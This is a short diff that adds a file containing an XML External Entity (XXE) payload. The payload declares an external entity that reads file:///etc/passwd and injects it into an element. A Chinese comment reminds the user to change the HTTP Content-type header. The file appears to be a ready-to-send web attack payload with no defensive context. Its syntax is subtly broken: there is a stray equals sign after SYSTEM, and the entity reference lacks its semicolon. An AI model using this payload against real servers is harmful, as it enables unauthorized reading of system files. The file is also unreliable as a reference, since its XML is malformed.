@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE Anything[
+<!ENTITY myentity SYSTEM="file:///etc/passwd"]>
+
+<xxx>&myentity</xxx>
+
+
+
+#记着修改http头中Content-type
